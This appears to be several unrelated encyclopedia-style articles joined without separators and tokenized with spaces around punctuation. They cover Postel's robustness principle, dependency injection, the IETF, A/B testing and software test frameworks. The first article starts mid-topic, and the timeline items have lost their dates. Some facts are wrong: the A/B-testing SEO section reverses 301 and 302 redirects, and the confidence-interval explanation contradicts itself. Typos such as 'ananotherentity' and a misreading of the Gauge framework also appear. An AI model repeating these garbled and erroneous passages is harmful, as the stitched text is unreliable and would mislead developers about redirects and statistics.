" In RFC 761 , he says in a section named Robustness Principle , " be conservative in what you do , be liberal in what you accept from others .
" Tim Bray argues why applying the law to the parsing of XML documents can be harmful , particularly when the document has financial data .
Eric Allman publishes an article titled The Robustness Principle Reconsidered .
He explains that the law made sense in the early days of the Internet when folks cooperated .
Today , the world is more hostile and security is a concern .
The law is still relevant , but a line must be drawn between being conservative and being liberal .
For example , we can be liberal and accept a packet even when the byte allocated for an optional field is not set to zero .
On the other hand , we should n't be liberal in accepting wrongly encoded digital signatures .
M. Thomson proposes an alternative to Postel 's Law .
He states this as follows , Protocol designs and implementations should be maximally strict .
Comparing a traditional component with another , its dependencies are injected .
Source : Aasenden 2015 .
The recommended practice in creating complex software is to adopt a modular design .
Functionality is decomposed into modules or classes , each doing something specific and exposing their services via well - defined interfaces .
This implies that one module will often depend on other modules or components of the system .
Dependencies among modules can lead to code that 's tightly coupled and less maintainable .
Dependency Injection ( DI ) is therefore used to resolve dependencies at runtime rather than at compile time .
Objects that have dependencies will not themselves create those dependencies .
They will instead rely on ananotherentity to create and inject those dependencies .
Dependency Injection is considered a design pattern and not a framework .
It 's one way of implementing a more general software concept called Inversion of Control ( IoC ) .
It 's also part of the SOLID Design Principles .
Could you explain dependency injection with an example ?
An introduction to Dependency Injection .
Source : Jenkov 2010 .
Let 's consider a class called ` XRateForecaster ` that forecasts currency exchange rates .
It accesses a database to obtain historical rates .
It accesses a remote service for real - time rates .
It also invokes an algorithm that does the forecasting .
This class therefore has three dependencies that need to be fulfilled for it to work properly .
Without DI , ` XRateForecaster ` will probably instantiate these dependencies on its own .
This would work , but what happens if these dependencies are modified in the future ?
` XRateForecaster ` would need to be modified .
Worse still , ` XRateForecaster ` is tightly coupled with its dependencies .
We ca n't do any unit testing with it without resolving its dependencies .
With DI , the dependent class does not construct its dependencies .
The dependencies are injected into it at runtime .
Obviously , moving legacy code to this design pattern implies that code has to be refactored .
It should be noted that DI does n't remove dependencies .
It merely separates the creation of dependencies from their consumption .
What are the benefits of using dependency injection ?
DI loosens the tight coupling between modules , classes or services .
Code maintainability improves .
Codes can be reused .
Because dependencies are injected at runtime , a different mock implementation can be injected for the purpose of unit testing .
In fact , unit testing is one of the big benefits of adopting DI .
With DI , different implementations of the dependencies can be supplied .
In other words , the dependent class can be written in abstraction without worrying about concrete implementations of its dependencies .
Dependencies are no longer scattered across the app .
They can be centralized in a container , or specified in an XML file .
Dependency carrying happens when a class instantiates a service it does n't need but one of its dependencies needs .
DI solves this problem .
Jakob Jenkov describes many situations where DI is useful .
What are some potential problems with using dependency injection ?
Because dependencies are resolved at runtime , errors in dependencies can not be caught at compile time .
Tracing dependencies can be difficult .
In languages such as Java or C # , there can be an explosion of data types .
Programmers can become overdependent on DI frameworks .
Learning a specific DI framework and managing the configuration can be extra work .
Using DI for the sake of using it is wrong .
If you 're never going to use another implementation or configuration , then it 's best to avoid DI .
One of the principles of object - oriented programming is encapsulation , but DI breaks encapsulation .
DI brings some of the implementation details , the dependencies , out to the interface .
DI can be done without containers .
In fact , it 's been said that containers add more lines of code and even more files if XML configuration is used .
It adds unnecessary complexity .
Worse still , using global singletons as an injector causes problems .
What are the different types of dependency injection ?
There are three common ways of injecting dependencies : Constructor Injection : Dependency is passed to the object via its constructor that accepts an interface as an argument .
A concrete class object is bound to the interface handle .
This is typically used if the dependent object has to use the same concrete class for its lifetime .
Method Injection : A.k.a .
interface - based injection .
Dependency is passed to the object via a method .
This is useful if a different concrete object needs to be used at different times .
For example , if the dependency is a notification , sometimes this may be sent as an SMS , and other times as an email for the same dependent object .
Property Injection : A.k.a .
setter injection .
If the dependency is selected and invoked at different places , we can set the dependency via a property exposed by the dependent object , which can then invoke it later .
An alternative to the above is Service Locator , which abstracts away the job of resolving dependencies .
However , some identify this , too , as a form of dependency injection since the locator itself has to be injected into the dependent object .
Are there frameworks for dependency injection ?
Illustration of service injection into Angular components .
Source : Angular Guide 2018 .
While it 's possible to implement dependency injection without any frameworks , what if your dependencies themselves depend on other dependencies ?
Frameworks simplify the job by providing what 's called an IoC Container or Dependency Injection Container ( DIC ) .
A container will create a dependent object along with its dependencies .
Writing container code can also get tedious since we need to create one for each dependent class .
This is where frameworks come in by providing generic DICs that can read in configuration information about dependencies , say , from an XML file .
Spring Framework , PicoContainer , HiveMind , XWork , Java EE6 CDI , Weld , Google Guice , Salta , Glassfish HK2 , Dagger and Managed Extensibility Framework ( MEF ) are example DI frameworks .
For .NET , DI frameworks include Spring .
NET , Castle Windsor , Unity , StructureMap , Autofac and Ninject .
In Spring , there are at least three ways of doing DI : XML , annotations , pure Java code .
Angular has its own DI mechanism using ` @Injectable ` decorator .
ASP.NET Core does it via its built - in service container , ` IServiceProvider ` . Google Guice uses ` @Inject ` constructor annotation .
For Android , there 's Dagger , RoboGuice , ButterKnife and Android Annotation .
Could you share some tips on dependency injection for beginners ?
Code refactoring is required for dependency injection .
Source : Adapted from Microsoft Docs 2010 , fig .
1 , 2 .
Passing in too many dependencies is an indication that the class is doing too much .
It 's better to split the class into multiple classes , each having a specific responsibility .
Injecting dependencies but not using them or passing them to other classes is another anti - pattern .
Inject interfaces , not implementations .
Know what services need to be exposed , mark them public and keep all others private .
If you use configuration files ( XML , YAML , etc .
) keep them readable .
A common anti - pattern is to invoke a singleton static container to instantiate services from within a dependent class .
This is the service locator approach .
It 's using IoC container without doing DI .
Instead , inject an interface into the constructor .
If you use containers , register all components and resolve at the root component .
DI is not the only way to achieve IoC. Other ways include factory pattern , template method pattern , strategy pattern and service locator pattern .
However , for example , with factory pattern , the class still instantiates the factory and dependencies from within rather than being injected from the outside .
Robert Martin notes that object - oriented design on its own will not make code robust , maintainable and reusable .
The pattern of interdependencies across subsystems matters too .
A module 's intent should not be dependent on its details .
He uses the term Dependency Inversion .
In June 1995 , he defined the Principle of Dependency Inversion . Details should depend upon abstractions .
Abstractions should not depend upon details .
The term Inversion of Control ( IoC ) was coined by Brian Foote .
He implies that frameworks do n't have the power .
They are extensible skeletons and their behaviour is tailored by methods supplied by client code or application .
In essence , components are externally managed .
Mazzocchi is credited with popularizing IoC. Source : PicoContainer 2017 .
Stefano Mazzocchi and others proposed the Java Apache Server Framework , later called Avalon .
This uses IoC as one of its fundamental design principles .
Avalon may be credited with popularizing IoC. According to Mazzocchi , IoC is really about isolation , modularity and reuse .
The need to inject dependencies is an effect , not the cause .
The Spring Framework has been released .
Spring was conceived by Rod Johnson a year earlier and released as part of his book on the framework .
It uses DI and IoC containers , although he states that the term DI was coined in late 2003 .
Also , in 2003 , names type 1/2/3/4 were renamed to today 's familiar names interface / setter / constructor injection .
Martin Fowler coins the term Dependency Injection in an article .
He explains that it 's a specific form of Inversion of Control ( IoC ) .
He also compares it to an alternative pattern called Service Locator .
IETF logo .
Source : ietf.org .
Accessed 2017 - 03 - 28 .
The Internet Engineering Task Force ( IETF ) can be described " as a large open international community of network designers , operators , vendors , and researchers concerned with the evolution of the Internet architecture and the smooth operation of the Internet .
" Equivalently , " IETF is a loosely self - organized group of people who contribute to the engineering and evolution of Internet technologies .
It is the principal body engaged in the development of new Internet standard specifications .
The IETF is unusual in that it exists as a collection of events , but is not a corporation and has no board of directors , no members , and no dues .
" IETF is driven by individuals , not companies or governments .
Although IETF produces standards ( and non - standards documents ) , it 's not called a standards body .
IETF has been successful due to the openness in its processes .
Why do we need IETF ?
The Internet is complex : diversity of applications , variety of protocols , multiple vendors , different implementations , massive scale of deployment , worldwide reach across geographies , and so on .
If two endpoints on the Internet have to communicate and be understood , they need to speak the same language .
IETF fulfils the role of standardizing architecture and protocols for the Internet .
This enables things to work together despite the diversity of vendors , implementations and protocols .
The goal of the IETF is to make the Internet work better .
It does this by making relevant protocol standards , best current practices and informational documents .
What are the cardinal principles that guide the IETF ?
To fulfil its mission , IETF follows these principles : Open process : All activities of IETF are open for public participation .
All published documents are openly accessible .
Technical competence : Quality is ensured by staying within domains where members have technical competence .
Volunteer core : Work is done on a voluntary basis by those who believe in the IETF 's mission .
Protocol ownership : When IETF takes ownership of a protocol it also becomes responsible for it .
What does openness mean for IETF ?
Openness within IETF takes three forms : Open standards : Anyone can join mailing lists , Working Groups and attend meetings .
Anyone can create and upload a new document .
Anyone can suggest modifications to proposals .
The process of standardization is open to all without fees or formal membership .
Open documents : All documents are easily and freely accessible on the Internet .
Open source : Working implementations and proven interoperability are important before a proposal becomes a standard .
Such implementations are open - source .
While other organizations or standards bodies may be open in terms of publication and ownership , IETF adopts the most open approach that includes development and participation .
Why has IETF been successful so far ?
Comparison of the OSI model and the Internet TCP / IP model .
Source : Khabat 2015 .
When Open Systems Interconnection ( OSI ) standards were all in rage in the mid-1980s , the Internet and its protocols were part of a government - funded research project .
The Internet of the 1980s did not carry much commercial or for - profit traffic .
Yet by the early 1990s , the Internet model , not the OSI model , became the de facto architecture for the Internet .
This , and the Internet 's continued success , can be attributed to the open working model and organization of IETF .
Besides openness , IETF takes a bottom - up approach .
In other words , people get together to create working groups .
Neither IAB nor IESG create WGs on their own .
The IETF does not require unanimity .
Typically , a consensus is achieved if 80 - 90 % of people agree to a proposal .
There 's no voting , but a show of hands may be used .
Working implementations that interoperate prove that the proposal works in practice .
This forces WGs to simplify protocols and even take out stuff that does n't work .
Dr. David C. Clark of MIT summed it up nicely . We reject kings , presidents , and voting .
We believe in rough consensus and running code .
Do authors have copyright over the documents they produce ?
All IETF are publicly available on the Internet .
They can be downloaded free of cost by anyone .
IETF gets a limited copyright to publish and derive from the documents .
Once published on IETF , authors can not withdraw the documents at a later point .
All other rights are with the authors .
What 's the organizational structure within IETF ?
IETF organizational structure .
Source : White 2015 .
Closely associated with IETF are the following : Internet Society ( ISOC ) : IETF by itself is not a legal entity .
It can be seen as an organized activity of the Internet Society ( ISOC ) .
ISOC provides the legal umbrella for IETF and funds its activities .
Internet Research Task Force ( IRTF ) : While IETF focuses on near term objectives and making standards , its sister organization , IRTF , looks at longer term research .
Its activities are managed by the Internet Research Steering Group ( IRSG ) .
Internet Architecture Board ( IAB ) : IETF and IRTF are overseen by the IAB .
IAB focuses on architectural issues and procedural issues .
It also manages all external relations .
IAB was previously called the Internet Activities Board .
It is chartered by ISOC .
Independent Submissions Editorial Board ( ISEB ) : Led by the Independent Submissions Editor ( ISE ) , this board reviews and publishes documents relevant to the Internet but outside the scope of IETF / IRTF / IAB .
Internet Engineering Steering Group ( IESG ) : IESG manages IETF activities and processes .
It approves the standards produced by IETF .
IAB advises IESG .
Nominating Committee ( NomCom ) : NomCom nominates suitable candidates to serve on IESG and IAB .
Which external organizations are associated with the IETF ?
IETF works with other standards bodies because its work often builds upon or interfaces with other standards .
For example , IETF cooperates with IANA ( Internet numbers ) , IEEE ( Ethernet ) , ETSI ( Cellular Radio ) , ITU - T ( PHY layer standards ) , ISO / IEC ( UTF-16 , mime types ) , W3C ( HTML ) , and more .
How to become a member of IETF ?
IETF has no formal membership .
Anyone who joins a mailing list or attends an IETF meeting can be called a member .
What are the types of documents produced by IETF ?
IETF document types and their transitions .
Source : Devopedia.org .
Broadly , documents can be either Internet - Drafts ( I - Ds ) or RFCs .
Internet - Drafts are temporary documents that are valid for six months .
Because of their temporary nature , they are not to be cited .
Anyone can start such a draft even without a Working Group .
They have no formal status until they become adopted by a WG or become an RFC .
The RFC originally stood for Request for Comments but today ( March 2017 ) a published RFC can not be modified .
An RFC could be supplemented by errata .
In fact , Internet - drafts are more in the spirit of documents requesting comments .
When Internet - Drafts become RFCs , they fall into one of these categories : Non - standards documents : Informational , Historic , Experimental .
Standards documents : Proposed Standard or Internet Standard .
An intermediate Draft Standard has been discontinued since 2011 .
Best Current Practices What 's the IETF standardization process ?
IETF work happens within Working Groups ( WGs ) that are part of a topical area .
As of March 2017 , there were 7 areas and 100 + WGs .
Each Area has a couple of Area Directors ( ADs ) .
Each WG will have its set of deliverables clearly defined plus any liaison with other WGs .
Except for the annual meetings , WGs do all their work via mailing lists .
Documents produced by WGs are reviewed by IESG .
The RFC Editor publishes the final document .
Internet - Drafts can become Proposed Standard RFCs , where they will remain for at least six months .
Interoperatiblity of multiple implementations must be proven at this stage .
A last call for comments is put out .
Finally , it becomes an Internet Standard RFC .
RFCs superseded by newer updates become Historic RFCs .
Experimental RFCs are used for exploring new technology including feasibility studies .
The complete process is documented on RFC 2026 , BCP 9 .
How is IETF funded ?
Funding of IETF 2008 - 2016 .
Source : IETF Endowment 2016 .
From the time of its inception till 1997 , IETF was funded by the US government , notably ARPA , NSF , NASA and DOE .
Since 1998 , ISOC has been the main funding body for the IETF .
However , ISOC did fund IETF prior to this .
For example , US$ 225 K was given in 1993 .
Since March 1991 , IETF also charges meeting fees for attendees .
These are used to cover meeting expenses plus secretariat expenses .
As of 2016 , IETF operated on an annual budget of US$ 6million , of which about US$ 2million comes from ISOC . In July 2016 , some companies and organizations donated US$ 3million towards a fund called IETF Endowment .
This fund 's purpose is to " provide long - term stability and increased diversity for funding IETF activities and operations .
" Volunteers themselves may be self - funded or sponsored by either their employers or other sponsors .
The first meeting of IETF is held with attendees from agencies funded by the US government .
ARPANET 's Network Working Group may be regarded as its precursor .
The fourth meeting of IETF is held for which the public is invited to attend .
Since then , all meetings are open to the public .
The concept of Working Groups ( WGs ) is introduced .
From 1991 , meetings were held thrice a year .
Previously , meetings were quarterly events .
ISOC was formed .
ISOC is an international , membership - based non - profit organization .
It also provides the legal umbrella for the IETF , which IETF accepted in 1996 .
The relationship and responsibilities between IAB and IETF come under scrutiny and clarification .
IETF moves from being a US government - funded activity to one funded by the Internet Society ( ISOC ) .
The US government stopped direct funding to the IETF .
From 1998 , ISOC became the main funding channel for the IETF .
The IETF Trust was established to manage copyrights .
Two groups see different versions resulting in different conversion rates .
Source : Knotko 2018 .
Does your manager decide based only on intuition and experience , not data ?
Do you like to experiment and analyze test results ?
Would you like data to validate your assumptions ?
Do you prefer to make data - driven decisions ?
If your answers to these questions are " YES " , then A / B testing is relevant .
A / B Testing is a method to compare two ( or more ) variations of something and determine which one works better .
In this method , users are randomly assigned to one of two variants .
A statistical analysis is performed to determine which variation performs better for a defined business goal .
While A / B testing is applied in many areas ( life sciences , social sciences , advertising , etc .
) This article focuses on applications for web / mobile app design and user interfaces .
Why should I do A / B testing ?
In the world of advertising , there 's no way of telling if a campaign will be successful .
Huge advertising budgets have been wasted because of bad guesses .
What if we could instead test a small sample and use that data to figure out user preferences for the entire population ?
This is exactly what A / B testing offers .
When applied to digital marketing , the design of web pages or mobile app screens , A / B testing gives data that can help us choose among alternatives .
The goal is Conversion Rate Optimization ( CRO ) .
Conversion could mean a purchase , an email sign - up , account creation , survey completion or app download .
One survey showed that 67 % of participants chose A / B testing for CRO .
It was also the preferred method .
With A / B testing , you can make more out of your existing traffic .
Since even small changes can lead to better conversion or lead generation , the return on investment ( RoI ) can be massive sometimes .
The results help us to understand user behaviour better and determine what impacts user experience .
Testing validates assumptions .
It removes guesswork and enables data - informed decisions from " we - think " to " we - know " .
What does it mean to call " A / B " ?
The term " A / B " comes from the fact that two groups are used for the test .
The control group is shown the base version .
The test group is shown the variation .
These two groups are also called A and B respectively .
An alternative interpretation is that A and B refer to two variations that need to be tested to ascertain which one is better .
In this case , the baseline without either A or B , is the control group .
We may even call this " A / B / C " testing .
In life sciences , where A / B testing is used to measure the effectiveness of a drug , the test group is often called the treatment group .
What 's the recommended process for A / B testing ?
The A / B testing process .
Source : Jones 2016 .
The correct way to run an A / B test is to follow a scientific process : Set a Goal : Based on the business goal , a conversion metric is decided .
Example : number of visitors who sign up for the free trial .
Construct Hypothesis : Observe user behaviour and brainstorm hypotheses .
Prioritize what to test based on expected impact and difficulty of implementation .
Create Variations : Decide on which feature you want to vary , such as changing the colour or size of the call - to - action button .
Run Experiment : Randomly assign the users to test and control group and collect relevant data for analysis .
Analyze Results : Once the experiment is complete , you can analyze the results .
Ask which variation performed better and whether there was a statistically significant difference .
Repeat : Based on the results , if we want to test another variation , repeat the same process .
Could you share some tips when planning for A / B testing ?
A selection of design changes used in A / B testing .
Source : Vo 2016 .
Use your experience to know what variations could affect user behaviour for the relevant business goal .
The variation could be in text such as the title or heading .
It could be in terms of design , such as the choice of colour .
It could be a different layout .
It could be the number of fields in a form or when to send an email .
How long should you run the test ?
The common approach is to look at 95 % statistical significance , standard deviation of the conversion rate , and sample size .
You need 500 users per variation for statistical significance .
For search or category tests , there could be 1000 users .
Online calculators are also available to know how long to test : from Convert , from Optimizely .
An article in Smashing Magazine gives a list of Do 's and Don'ts .
Optimizely has shared what variations are businesses testing and which ones are effective .
Some common threats to the validity of A / B tests are explained in an article on Instapage blog .
What are some myths associated with A / B testing ?
Some things about A / B testing are misunderstood .
We clarify the following : A / B testing is not the same as conversion rate optimization .
A / B testing is part of optimization .
While conversions are important , pay attention to secondary metrics .
Analyze all steps of the funnel .
To test everything is probably a waste of resources , particularly when your user base is not as large as that of Google or Facebook .
Prioritize on things you think can make a real difference .
While changing one variable at a time is good advice , sometimes it makes sense to include multiple changes , such as on a badly designed page .
Consider also how factors interact with one another .
Your tests should be long enough to account for influencing factors , such as weekday vs weekend , or a big sale .
Look for 95 % statistical significance , but do n't rely on this alone to stop a test .
Wait to reach a calculated sample size or a stable conversion rate .
If you obsess over velocity and real - time optimization , you might make mistakes and lose out on valuable insights .
A one - off test may give temporary results .
Iterate your testing .
try to rule out false positives .
What do you mean by 95 % statistical significance ?
This is best explained with an example .
Suppose the results of an A / B test show " Control : 15 % ( + /- 2.1 % ) ; Variation 18 % ( + /- 2.3 % ) " .
You might interpret that the actual conversion rate is between 15.7 % and 20.3 % for the variation ; but this is in fact a common error among those not familiar with statistics .
The correct interpretation is that if we were to perform the tests multiple times , 95 % of the ranges would include the true conversion rate .
In other words , in 5 % of the tests , the true conversion rate will fall outside the range .
To put it differently , for the above example , we are 95 % confident that the true conversion rate is between 15.7 % and 20.3 % .
Ultimately , results from A / B testing must be statistically validated , usually with Chi - squared test , to rule out differences due to chance .
Among the tests are Fisher 's Exact , Fisher 's Monte Carlo and Chi - squared tests .
The last is the simplest for sample sizes exceeding 10,000 .
Fisher 's Monte Carlo , a computational feasible approximation of Fisher 's Exact , is more accurate for smaller samples .
How is A / B Testing different from Multivariate Testing ?
Test multiple changes on the same page with multivariate testing .
Source : Navot 2014 .
With A / B Testing , you 're splitting the traffic between two variations of a single variable .
What if we wished to test 10 different shades of blue for a button ?
This is considered as A / B / N Testing .
A visiting user is shown one of these variations .
When a page is modified in more than one way , we call it Multivariate Testing .
For example , in the control variation there 's no sign - up form or embedded video .
In variations , either one of these or both are included .
Tools will generate all possible combinations of variations once the variable - level changes are specified .
Such variations may be important to test the influence of one variable over another .
For example , the sign - up form might generate more sign - ups if there 's also a video on the page .
Because there could be many variations to test , this is suitable only for sites with high traffic .
However , use multivariate testing with caution due to the danger of spurious correlations , which could be nothing more than random fluctuations .
What are some tools available for A / B testing ?
A comparison of some A / B testing tools on relevant parameters .
& copy ; TrustRadius .
Source : Komarek 2016 .
TrustRadius lists a number of A / B testing tools and mentions that the top ones are Kameleoon , AB Tasty , Evergage , Qubit , Dynamic Yield , and Visual Website Optimizer .
Others include Optimizely , Monetate , and Maxymiser .
Another list includes Unbounce , Kissmetrics , Optimizely , Maxymiser , and Webtrends Optimize .
Another list of 30 tools includes Optimizely , Unbounce , Visual Website Optimizer , Usability Hub , Maxymiser , A / Bingo , Kissmetrics , Google Analytics , AB Tasty and Adobe Target .
Tools may be for small businesses , mid - sized businesses or large enterprises .
While many are paid tools or even managed services , Google Optimize is a free tool .
Google Optimize 360 is a paid enterprise - level tool .
These Google tools deprecate the older Analytics Content Experiments .
Basic features of a tool include splitting traffic to different variations , calculating conversions , and measuring the statistical likelihood that one variation will consistently outperform another .
Additional features may include easy creation of variations , customization , and multi - page campaigns .
Are there situations where A / B testing is not suitable ?
Data - driven design can not replace creative input .
Source : Andrasec 2011 , fig .
5 .
A / B testing can not make a good design choice on its own .
It can compare two or more design choices and help us decide which is better .
Incremental changes can improve design only up to a certain extent .
In order to improve it radically , the designer should think more creatively and understand the user 's needs better .
With A / B testing , we may find ourselves chasing " local maximum " , the best outcome but within narrow constraints .
There are therefore situations when we need to think outside the box and make radical changes .
A / B testing is not the way to do it .
There are also some reasons for A / B testing .
With A / B testing , you 're testing your own assumptions and therefore prone to individual bias .
A test could take 3 - 4 weeks , valuable time that could be spent elsewhere .
If your user base is not large , you 'll not achieve statistical significance .
When applied to websites , how does A / B testing affect SEO ?
Are there any best practices ?
A / B testing or multivariate testing does not pose any inherent risk to the website 's search rank if used properly .
However , it 's important to know the best practices : No cloaking : Serve the same content for users and search engines regardless of user - agent .
Use ` rel="canonical " ` : In A / B testing , alternative URLs should refer to the original URL as the canonical so that search engines will not index the alternative URLs .
Use 302 Redirects instead of 301s : When using redirection to a variant URL , use 302 redirects since the variant will exist only for the experiment .
301 is a temporary redirect while 302 is permanent .
Run experiments only as long as necessary : Once you have enough data , revert to the original site and remove variations .
Could you share some examples where A / B testing has been used ?
Humana 's A / B testing is an example .
Source : Pun 2016 .
Here are a few examples : Humana 's Banner Test : Humana tested two different banners on their homepage .
A simpler design plus a stronger call - to - action ( CTA ) led to 433 % more click - throughs .
In the control variation , the CTA is not clear and in the test variation the CTA is clear .
Hubspot 's Lead Conversion : Using an inline form for CTA led to 71 % better conversion compared to a linking to a form on a separate page .
MSN Home Page Search Box : The Overall Evaluation Criterion was the click - through rate for the search box and the popular search links .
The taller search box was compared with a bigger search button .
However , no remarkable differences were found .
Electronic Arts : For their SimCity 5 game , they tested conversions between direct promotional banner and no banner .
Surprisingly , the latter drove 43.4 % more purchases .
Coderwall : A simple title change improved Coderwall 's click - through rate ( CTR ) by 14.8 % on Google Search .
Over time , this resulted in improved ranking as well .
James Lind publishes " A Treatise of Scurvy " in which he compares different treatments for scurvy using controlled trials .
In well - planned clinical trials from the late 1740s , James Lind provided remedies for the identical diets of six pairs of men with symptoms of scurvy .
He finds that a diet that includes oranges and lemons ( vitamin C ) cures scruvy .
Austin Flint conducted a clinical trial that compares the efficacy of a dummy simulator to an active treatment .
The dummy simulator , also called placebo , is really for moral effect .
Flint 's technique is called " Placebo and Active Treatment " .
Used from at least the 18th century , placebos avoid observer bias .
Statistician and biologist Ronald Fisher discovers the most important principles behind A / B testing and randomized controlled experiments in general .
He ran the first experiment in agriculture .
In his book " Scientific Advertising " , Claude Hopkins writes , almost any question can be answered , cheaply , quickly and finally , by a test campaign .
And that ’s the way to answer them — not by arguments around a table .
Go to the court of last resort — the buyers of your product .
The Medical Research Council conducted the first ever randomized clinical trial to determine the efficacy of streptomycin in the treatment of pulmonary tuberculosis .
Unlike prevailing practice , subjects are randomly allocated to one of two test groups , thus avoiding any bias .
A / B testing has increasingly applied in clinical trials since the early 1950s .
In the 1960s and 1970s , marketers started using A / B testing to evaluate direct response campaigns .
An example hypothesis would be , " Would a postcard or a letter to target customers result in more sales ?
" With the coming of the World Wide Web in the 1990s , A / B testing goes online and becomes real time .
It can also scale to a large numbers of experiments and participants .
The underlying math has n't changed though .
Google engineers conduct A / B tests to find the optimal number of display results per page .
The test was a failure due to a performance bias because variants that displayed more results were slower .
But Google did learn many lessons about the impact of speed on user experience .
Obama 's presidential campaign has a new digital team advisor , Dan Siroker .
He introduces A / B testing in the campaign with the goal of converting visitors into donors .
A team at Google ca n't decide between two shades .
So they test 41 different shades of blue to decide which color to use for advertisement links in Gmail .
The company shows each shade of blue to 1 % of users .
A slight purple shade of blue gets the maximum clicks , resulting in a $ 200 million boost in ad revenue .
Google runs 7,000 A / B test experiments on its search algorithm .
Like Google , Netflix , Amazon and eBay are keen adopters of A / B testing .
Engineers write test cases to ensure that software works as expected .
Often , test cases require common services .
These services are also agnostic of each test .
The purpose of test frameworks is to provide a common platform for writing , organizing and executing test cases .
A test framework is a set of guidelines or rules that enable more efficient testing .
To say it differently , a test framework provides a consistent interface between your code and your tests .
Test frameworks basically provide the scaffolding .
Test engineers can therefore focus on writing tests and testing the core functionality of their software .
The term Test Automation Framework is commonly used , though test frameworks can , in rare cases , be used to aid manual testing .
What are some benefits of using a test framework ?
Some benefits include improved test efficiency , lower maintenance costs , minimal manual intervention , maximum test coverage , code reuse , handling of recovery scenarios , and easy reporting .
Obviously , test frameworks play an essential role in test automation , and test automation increases the depth and scope of testing .
Lengthy or complex tests are hard to run manually .
Developers can also focus on creating more tests than spending time executing tests .
Essentially , better testing leads to higher quality software in a short time to market .
It 's recommended that you select a framework already available on the market rather than write your own custom framework .
By doing this , you can focus on writing effective test cases and test suites .
What 's the typical execution process of a test framework ?
Katalon Studio uses listeners to complement setup / teardown calls .
Source : Katalan Studio Docs 2018 .
Here we describe the typical process .
Further details will vary depending on the features that frameworks support .
The process starts by gathering all the tests for execution .
These tests are commonly grouped within test suites that are manually specified or could be discovered by convention .
For example , all method / function names starting with a certain prefix are treated as executable tests .
Test executions start and end with setup and teardown code respectively .
This setup / teardown code could be at test suite level , module level , test case level , or all of these .
Within each test , one or more assertions are invoked .
These compare current runtime status with expected status .
If as expected , the test execution continues .
If not as expected , the test fails .
Stack traces may be recorded for later analysis .
Extra logs may be taken .
In all cases , the final verdict from test execution is recorded .
The final stage is reporting .
Reports in preferred formats will contain summary , test verdicts , test - level execution metrics , and access to logs or traces .
What features should I look for when choosing a test framework ?
Test framework block diagram .
Source : Flenner 2017 .
As with any tool , you should look at industry adoption , cost , performance , stability , scalability , ( community ) support , documentation , and features .
Here are some features expected of a good framework : Agnostic : Agnostic of System Under Test ( SUT ) , automation libraries , platform or OS .
Language : What scripting languages are supported ?
Usage : Easy to install , configure and use .
Integration : Integrates well with automation tools , Continuous Integration ( CI ) tools , issue tracking tools , etc .
Reporting : Generates detailed reports and analytics on test executions .
Captures failure logs .
Collects execution metrics .
Customization : Extend the framework .
Group , tag , order or skip tests .
Configure the test environment .
Modular : Clear separation of framework layer and automation test suite .
Automation infrastructure should follow coding conventions and design patterns .
Promotes reuse of modules or libraries .
Data : Test scripts are separated from the data .
Support for parameterized testing .
Discovery : Discover tests in project paths and automatically compose test suites for execution .
Playback : Record steps of manual tests and play them back for automated testing .
What are some types of test frameworks ?
Common types of test frameworks .
Source : Devopedia .
Test frameworks differ in their approach to testing , which are briefly described as follows : Linear : Tests are independent of one another , often created by recording manual actions and replaying them .
Module Based : The application is tested on its smaller parts ( functions , modules , sub - systems ) .
Tests can be combined to enable system - level tests as well .
Library Based : Reusable libraries are identified and written .
Good for test maintenance and scalability .
Data Driven : Focus is on executing a test with different input data .
Data is read from databases or spreadsheets .
There 's a clear separation of test scripts and input data .
Hard - coding of data within scripts is avoided .
Keyword Driven : An extension of the data - driven approach .
Test execution is basically a sequence of steps defined by keywords .
Keywords are mapped to objects and actions in a shared object repository .
Promotes reuse .
Behaviour Driven : Tests are written in a descriptive style so that even business stakeholders can understand them .
Tests are in terms of behaviours and user - focused scenarios .
Hybrid : A mix of the above .
Could you name some test frameworks out there ?
A comparison of some test frameworks .
Source : Anderson 2017 .
A blog post on DZone ( March 2018 ) identified ten open source test frameworks : Selenium , Carina , EarlGrey , Cucumber , Watir , Appium , RobotFramework , Apache JMeter , Gauge and Robotium .
Selenium is mainly for web apps while Appium is for mobile apps .
Carina can use the automation of Selenium or Appium .
Watir is based on Ruby while RobotFramework is based on Python .
Watir supports data - driven testing while RobotFramework uses a keyword - driven approach for acceptance testing .
Cucumber is a framework for Behaviour - Driven Development ( BDD ) .
Tests are written in Gherkin language and the focus is on acceptance testing .
Another list on TestBeacon includes Serenity , Cypress , RobotFramework , RedwoodHQ , Sahi , Galen , Gauge , Citrus , and Karate - DSL .
Serenity uses Selenium WebDriver and BDD tools such as Cucumber and JBehave .
Cypress enabled Test - Driven Development ( TDD ) .
Galen is useful for testing layouts and user experience .
A gauge might suit TDD and BDD practitioners .
Citrus is suitable for testing network calls such as REST or SOAP .
Specific to Android testing are Appium , Robotium , Selendroid , MonkeyTalk , Calabash , UI Automator , Magneto , Kobiton , Squish , SeeTest , KMAX , MonkeyRunner , Frank , KIF , and Testdroid .
Wikipedia has a long list of test frameworks .
How is a test automation tool different from a test framework ?
There 's a difference between a test framework and a test automation tool .
An automation tool provides the implementation of testing actions .
For example , Selenium WebDriver implements actions that mimic user actions on user interfaces .
Thus , Selenium WebDriver is an automation tool .
However , Selenium WebDriver can be called from within any framework that supports it .
For example , pytest is a test framework in Python , and since Selenium has Python support , we can call Selenium WebDriver APIs from Python scripts that are managed by pytest .
Tools such as Selenium IDE is a simple framework that has the automation part built into it .
How is a test management tool different from a test framework ?
A test management tool is more about managing the testing process .
This includes interfacing with various tools and processes that manage requirements , plan product releases , do reporting , track defects , execute tests , etc .
There are plenty of such tools in the market .
A few of them include qTest , PractiTest , Zephyr , Test Collab , and TestFLO for JIRA .
A test framework is more about writing , managing and executing the tests .
They are also about test automation .
While frameworks may integrate with other tools and processes , their focus is more on testing rather than the bigger picture .
At WyattSoftware , Gary Goldberg manages his test cases on spreadsheets .
This is for financial software written in Smalltalk .
His colleague Ward Cunningham wrote a framework to read the tests and execute them .
This is probably one of the earliest test frameworks .
A SUnit test suite with three tests and results .
Source : Beck 1994 .
Kent Beck writes SUnit for unit testing of Smalltalk code .
It has only three classes ( TestCase , TestSuite , TestResult ) and twelve methods .
Inspired by SUnit , Kent Beck and Erich Gamma created JUnit for Java unit testing .
At ThoughtWorks , Jason Huggins created what 's now called Selenium 1 Core to automate web app testing .
It uses scripts encoded on HTML tables .
Selenium is today managed by the Software Freedom Conservancy .
At the Selenium Conference 2012 , Dan Cuellar gave a lightning talk about automating iOS app testing using Selenium - style syntax written in C # .
Later that year , he open sources the code and added support for Python .
Jason Huggins adds Selenium WebDriver support .
At the Mobile Testing Summit in November , it was launched as Appium .
In 2016 , Appium was handed over to JS Foundation .
